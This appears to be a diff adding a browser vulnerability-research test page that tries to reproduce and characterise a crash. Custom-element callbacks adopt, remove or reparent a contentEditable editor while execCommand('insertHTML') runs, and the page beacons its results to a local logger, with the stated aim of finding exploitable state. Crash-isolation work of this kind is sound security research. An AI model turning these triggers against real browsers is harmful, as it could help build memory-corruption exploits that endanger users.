@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1271</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1271-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1271: ADOPTNODE CRASH ISOLATION ===');
+log('P1270-B2 crashed: adoptNode(editor) during insertHTML connectedCallback');
+log('Goal: isolate trigger, characterize crash, find exploitable state');
+B('START','P1271');
+
+// Shared iframe creator
+function makeIframe(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return ifr;
+}
+</script>
+
+<!-- A: Baseline — does adoptNode of a contentEditable crash OUTSIDE execCommand? -->
+<script>
+log('\n--- A: adoptNode of editor (no execCommand) ---');
+(function(){
+  try{
+    var editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Test content</p><p>More content</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    // Set a selection
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    B('A1','before|sel_ranges='+sel.rangeCount+
+      '|html='+editDiv.innerHTML.slice(0,100));
+
+    // adoptNode WITHOUT execCommand
+    var ifr=makeIframe();
+    var adopted=ifr.contentDocument.adoptNode(editDiv);
+    ifr.contentDocument.body.appendChild(adopted);
+
+    B('A2','adopted|ownerDoc='+(editDiv.ownerDocument===document?'main':'iframe')+
+      '|sel_ranges='+sel.rangeCount+
+      '|html='+editDiv.innerHTML.slice(0,100));
+
+    // Move back
+    document.adoptNode(editDiv);
+    document.body.appendChild(editDiv);
+
+    B('A3','restored|ownerDoc='+(editDiv.ownerDocument===document?'main':'iframe')+
+      '|in_dom='+document.body.contains(editDiv));
+
+    // Can we still edit after restore?
+    editDiv.focus();
+    sel.removeAllRanges();
+    range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+    var boldResult=document.execCommand('bold');
+
+    B('A4','edit_after_restore|bold='+boldResult+
+      '|html='+editDiv.innerHTML.slice(0,150));
+
+    editDiv.parentNode.removeChild(editDiv);
+    ifr.parentNode.removeChild(ifr);
+  }catch(e){B('A0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- B: Does adoptNode during connectedCallback (no execCommand) crash? -->
+<script>
+log('\n--- B: adoptNode during connectedCallback (no execCommand) ---');
+(function(){
+  try{
+    var cbLog=[];
+    var targetDiv;
+    var ifrB;
+
+    customElements.define('x-adopt-test', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(this.id==='at1' && targetDiv){
+          try{
+            if(!ifrB){ifrB=makeIframe();}
+            // Adopt the PARENT div (not editor, just container) during CE connection
+            var adopted=ifrB.contentDocument.adoptNode(targetDiv);
+            ifrB.contentDocument.body.appendChild(adopted);
+            cbLog.push('adopted_parent');
+
+            // Move back immediately
+            document.adoptNode(targetDiv);
+            document.body.appendChild(targetDiv);
+            cbLog.push('restored');
+          }catch(e){
+            cbLog.push('err:'+e.name+':'+e.message.slice(0,40));
+          }
+        }
+      }
+    });
+
+    targetDiv=document.createElement('div');
+    targetDiv.style.cssText='position:absolute;left:-9999px';
+    targetDiv.innerHTML='<p>Before CE</p>';
+    document.body.appendChild(targetDiv);
+
+    // Add a custom element — its callback will adopt the parent
+    var ce=document.createElement('x-adopt-test');
+    ce.id='at1';
+    targetDiv.appendChild(ce);
+
+    B('B1','log='+cbLog.join(';')+
+      '|target_inDOM='+document.body.contains(targetDiv)+
+      '|children='+targetDiv.childNodes.length);
+
+    if(targetDiv.parentNode)targetDiv.parentNode.removeChild(targetDiv);
+    if(ifrB&&ifrB.parentNode)ifrB.parentNode.removeChild(ifrB);
+  }catch(e){B('B0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- C: MINIMAL REPRO — adoptNode of editor during insertHTML connectedCallback -->
+<!-- This is what crashed in P1270-B2. Wrapped in try/catch with pre-beacon -->
+<script>
+log('\n--- C: MINIMAL CRASH REPRO (adoptNode + insertHTML) ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+    var ifrC;
+
+    customElements.define('x-crash-repro', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc');
+        if(editDiv){
+          try{
+            if(!ifrC){ifrC=makeIframe();}
+            // THE CRASH: adopt editor to iframe during insertHTML
+            var adopted=ifrC.contentDocument.adoptNode(editDiv);
+            ifrC.contentDocument.body.appendChild(adopted);
+            cbLog.push('adopted');
+
+            // Try to move back immediately
+            document.adoptNode(editDiv);
+            document.body.appendChild(editDiv);
+            cbLog.push('restored');
+          }catch(e){
+            cbLog.push('err:'+e.name+':'+e.message.slice(0,60));
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Editable content</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    B('C_PRE','about_to_crash|editDiv_in_dom='+document.body.contains(editDiv));
+
+    // This insertHTML will create x-crash-repro, whose connectedCallback
+    // will adoptNode the editor — THIS CRASHED P1270
+    try{
+      document.execCommand('insertHTML',false,
+        '<x-crash-repro id="cr1">CRASH_TRIGGER</x-crash-repro>');
+      cbLog.push('insertHTML_returned');
+    }catch(e){
+      cbLog.push('insertHTML_err:'+e.name+':'+e.message.slice(0,60));
+    }
+
+    B('C_POST','survived!|log='+cbLog.join(';')+
+      '|ownerDoc='+(editDiv.ownerDocument===document?'main':'iframe')+
+      '|html='+editDiv.innerHTML.slice(0,200));
+
+    if(editDiv.parentNode)editDiv.parentNode.removeChild(editDiv);
+    if(ifrC&&ifrC.parentNode)ifrC.parentNode.removeChild(ifrC);
+  }catch(e){B('C0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- D: Softer disruption — remove children during insertHTML callback -->
+<script>
+log('\n--- D: Remove editor children during insertHTML ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+
+    customElements.define('x-child-killer', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(editDiv && this.id==='ck1'){
+          try{
+            // Remove ALL other children of the editor during insertion
+            var toRemove=[];
+            for(var i=0;i<editDiv.childNodes.length;i++){
+              if(editDiv.childNodes[i]!==this){
+                toRemove.push(editDiv.childNodes[i]);
+              }
+            }
+            for(var i=0;i<toRemove.length;i++){
+              editDiv.removeChild(toRemove[i]);
+            }
+            cbLog.push('killed_'+toRemove.length+'_siblings');
+          }catch(e){
+            cbLog.push('kill_err:'+e.name);
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Para1</p><p>Para2</p><p>Para3</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    document.execCommand('insertHTML',false,
+      '<x-child-killer id="ck1">KILLER</x-child-killer>'+
+      '<p>After killer</p>'+
+      '<x-child-killer id="ck2">KILLER2</x-child-killer>');
+
+    B('D1','log='+cbLog.join(';')+
+      '|html='+editDiv.innerHTML.slice(0,300)+
+      '|children='+editDiv.childNodes.length);
+
+    editDiv.parentNode.removeChild(editDiv);
+  }catch(e){B('D0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- E: Replace innerHTML during insertHTML callback -->
+<script>
+log('\n--- E: innerHTML replacement during insertHTML ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+
+    customElements.define('x-inner-replace', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(editDiv && this.id==='ir1'){
+          try{
+            // Replace ALL content during insertion
+            editDiv.innerHTML='<p>COMPLETELY_REPLACED</p>';
+            cbLog.push('replaced');
+          }catch(e){
+            cbLog.push('replace_err:'+e.name);
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Original content</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    document.execCommand('insertHTML',false,
+      '<x-inner-replace id="ir1">INSERTING</x-inner-replace>'+
+      '<p>After replace element</p>');
+
+    B('E1','log='+cbLog.join(';')+
+      '|html='+editDiv.innerHTML.slice(0,300)+
+      '|children='+editDiv.childNodes.length);
+
+    editDiv.parentNode.removeChild(editDiv);
+  }catch(e){B('E0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- F: Remove the editor itself from DOM during insertHTML -->
+<script>
+log('\n--- F: Remove editor from DOM during insertHTML ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+
+    customElements.define('x-self-destruct', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(editDiv && this.id==='sd1'){
+          try{
+            // Remove the editor from the DOM entirely during insertion
+            if(editDiv.parentNode){
+              editDiv.parentNode.removeChild(editDiv);
+              cbLog.push('editor_removed');
+            }
+          }catch(e){
+            cbLog.push('remove_err:'+e.name);
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Content to edit</p><p>More content</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    B('F_PRE','about_to_remove_editor');
+
+    try{
+      document.execCommand('insertHTML',false,
+        '<x-self-destruct id="sd1">DESTRUCT</x-self-destruct>');
+      cbLog.push('insertHTML_ok');
+    }catch(e){
+      cbLog.push('insertHTML_err:'+e.name);
+    }
+
+    B('F1','log='+cbLog.join(';')+
+      '|in_dom='+document.body.contains(editDiv)+
+      '|html='+editDiv.innerHTML.slice(0,200));
+
+    if(editDiv.parentNode)editDiv.parentNode.removeChild(editDiv);
+  }catch(e){B('F0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- G: Change contentEditable attribute during insertHTML -->
+<script>
+log('\n--- G: Toggle contentEditable during insertHTML ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+
+    customElements.define('x-toggle-edit', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(editDiv && this.id==='te1'){
+          try{
+            // Turn off contentEditable during insertion
+            editDiv.contentEditable='false';
+            cbLog.push('editable_off');
+            // Turn it back on
+            editDiv.contentEditable='true';
+            cbLog.push('editable_on');
+          }catch(e){
+            cbLog.push('toggle_err:'+e.name);
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Editable stuff</p>';
+    document.body.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    document.execCommand('insertHTML',false,
+      '<x-toggle-edit id="te1">TOGGLE</x-toggle-edit><p>After</p>');
+
+    B('G1','log='+cbLog.join(';')+
+      '|editable='+editDiv.contentEditable+
+      '|html='+editDiv.innerHTML.slice(0,200));
+
+    editDiv.parentNode.removeChild(editDiv);
+  }catch(e){B('G0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<!-- H: Move editor to different parent during insertHTML -->
+<script>
+log('\n--- H: Reparent editor during insertHTML ---');
+(function(){
+  try{
+    var cbLog=[];
+    var editDiv;
+    var newParent;
+
+    customElements.define('x-reparent', class extends HTMLElement {
+      connectedCallback(){
+        cbLog.push('cc:'+this.id);
+        if(editDiv && this.id==='rp1'){
+          try{
+            // Move editor to a different parent (same document)
+            if(!newParent){
+              newParent=document.createElement('div');
+              newParent.id='new-parent';
+              newParent.style.cssText='position:absolute;left:-9999px';
+              document.body.appendChild(newParent);
+            }
+            newParent.appendChild(editDiv);
+            cbLog.push('reparented');
+          }catch(e){
+            cbLog.push('reparent_err:'+e.name+':'+e.message.slice(0,40));
+          }
+        }
+      }
+    });
+
+    editDiv=document.createElement('div');
+    editDiv.contentEditable='true';
+    editDiv.style.cssText='position:absolute;left:-9999px;width:200px';
+    editDiv.innerHTML='<p>Reparent test</p><p>Content here</p>';
+
+    var origParent=document.createElement('div');
+    origParent.style.cssText='position:absolute;left:-9999px';
+    document.body.appendChild(origParent);
+    origParent.appendChild(editDiv);
+    editDiv.focus();
+
+    var sel=window.getSelection();
+    sel.removeAllRanges();
+    var range=document.createRange();
+    range.selectNodeContents(editDiv);
+    sel.addRange(range);
+
+    B('H_PRE','about_to_reparent');
+
+    try{
+      document.execCommand('insertHTML',false,
+        '<x-reparent id="rp1">REPARENT</x-reparent><p>After</p>');
+      cbLog.push('insertHTML_ok');
+    }catch(e){
+      cbLog.push('insertHTML_err:'+e.name);
+    }
+
+    B('H1','log='+cbLog.join(';')+
+      '|parent='+(editDiv.parentNode?editDiv.parentNode.id||editDiv.parentNode.nodeName:'null')+
+      '|in_dom='+document.body.contains(editDiv)+
+      '|html='+editDiv.innerHTML.slice(0,200));
+
+    // Try editing after reparent
+    try{
+      editDiv.focus();
+      sel.removeAllRanges();
+      range=document.createRange();
+      range.selectNodeContents(editDiv);
+      sel.addRange(range);
+      var boldOk=document.execCommand('bold');
+      B('H2','edit_after_reparent|bold='+boldOk+
+        '|html='+editDiv.innerHTML.slice(0,200));
+    }catch(e){
+      B('H2','edit_err:'+e.name+':'+e.message.slice(0,60));
+    }
+
+    if(editDiv.parentNode)editDiv.parentNode.removeChild(editDiv);
+    if(origParent.parentNode)origParent.parentNode.removeChild(origParent);
+    if(newParent&&newParent.parentNode)newParent.parentNode.removeChild(newParent);
+  }catch(e){B('H0','err:'+e.name+':'+e.message.slice(0,120));}
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1271 COMPLETE ===');
+}, 5000);
+</script>
+
+</body>
+</html>
